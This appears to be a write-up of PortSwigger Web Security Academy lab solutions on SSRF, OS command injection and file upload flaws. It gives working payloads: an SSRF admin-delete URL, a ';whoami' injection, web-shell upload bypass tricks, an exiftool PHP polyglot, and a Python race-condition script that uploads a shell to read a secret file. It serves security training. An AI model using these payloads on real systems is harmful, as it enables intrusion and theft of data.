## Server-side request forgery (SSRF)
1. <b>Basic SSRF against the local server</b> - Go to one product from the home page and press `check stock`(intercept it with burp) send it to repeater and you will find a parameter named `stockApi` which has a url. In this url if we put `http://localhost/admin` and send the request we will see the admin panel. To solve this lab we have to put in `stockApi` param `http://localhost/admin/delete?username=carlos`
2. <b>Basic SSRF against another back-end system</b> - 

## OS command injection
1. <b>OS command injection, simple case</b> - Go to `https://xxxx.web-security-academy.net/product?productId=x` and start intercepting from burp while pressing the check stock button. Send it to repeater and chain the `whoami` command at the end of productId=x `productId=333;whoami&storeId=1`
2. <b>Blind OS command injection with time delays</b> - 


## File upload vulnerabilities
1. <b>Remote code execution via web shell upload</b> - Try to upload just a php script with .php extension
2. <b>Web shell upload via Content-Type restriction bypass</b> - Try to change <b>content-type</b> from x-php to <b>image/png</b>
3. <b>Web shell upload via path traversal</b> - Change the <b>filename</b> from burpsuite intercept to <b>..%2fget_flag.php</b> and get the flag to /files/avatars/../get_flag.php
4. <b>Web shell upload via extension blacklist bypass</b> - Change the filename from <b>.php</b> extension to <b>.phtlm</b> extension and upload it
5. <b>Web shell upload via obfuscated file extension</b> - Intercept upload request and change the filename with extension <b>.php%00.png</b> - <b>Null byte technique</b>
6. <b>Remote code execution via polyglot web shell upload</b> - For this lab we have to use <b>exiftool</b> and one random .jpg or .png image. The exploitation part `exiftool -comment="<?php system('badstuff');?>" image_name.png or .jpg -o get_flag.php` after that a php file will created with get_flag.php name upload it and redirect into it to get the flag.
7. <b>Web shell upload via race condition</b> - At the lab description we can find a <b>hint</b> which has inside the source code of upload functionality.
Lets explain the code
```php
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}
```
"As you can see from the source code above, the uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed. "
<br>
So I create a exploit with python multithreading,requests modules just to grab the flag.
```python
import requests
import threading

def upload_exploit():
	burp0_url = "https://0aa000fc0444aa3dc03a8981009500e6.web-security-academy.net:443/my-account/avatar"
	burp0_cookies = {"session": "sbjdev7ZM9sCuhQ2irsKrh0SjX7wddRT"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0aa000fc0444aa3dc03a8981009500e6.web-security-academy.net/my-account", "Content-Type": "multipart/form-data; boundary=---------------------------35393652352872705425704695024", "Origin": "https://0aa000fc0444aa3dc03a8981009500e6.web-security-academy.net", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
	burp0_data = "-----------------------------35393652352872705425704695024\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"get_flag.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php system('cat /home/carlos/secret')?>\n\r\n-----------------------------35393652352872705425704695024\r\nContent-Disposition: form-data; name=\"user\"\r\n\r\nwiener\r\n-----------------------------35393652352872705425704695024\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\nHEhkjls5YL1vQsQRNl2qJrpSAqeAsGMK\r\n-----------------------------35393652352872705425704695024--\r\n"
	requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


def get_flag():
	endpoint = "https://0aa000fc0444aa3dc03a8981009500e6.web-security-academy.net:443/files/avatars/get_flag.php"
	r=requests.get(endpoint)
	print(r.text)
	

t1 = threading.Thread(target=upload_exploit, name='t1')
t2 = threading.Thread(target=get_flag, name='t2')  
  
t1.start()
t2.start()
  
t1.join()
t2.join()

```

 [More tricks about file upload vulnerabilities](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#upload-tricks)
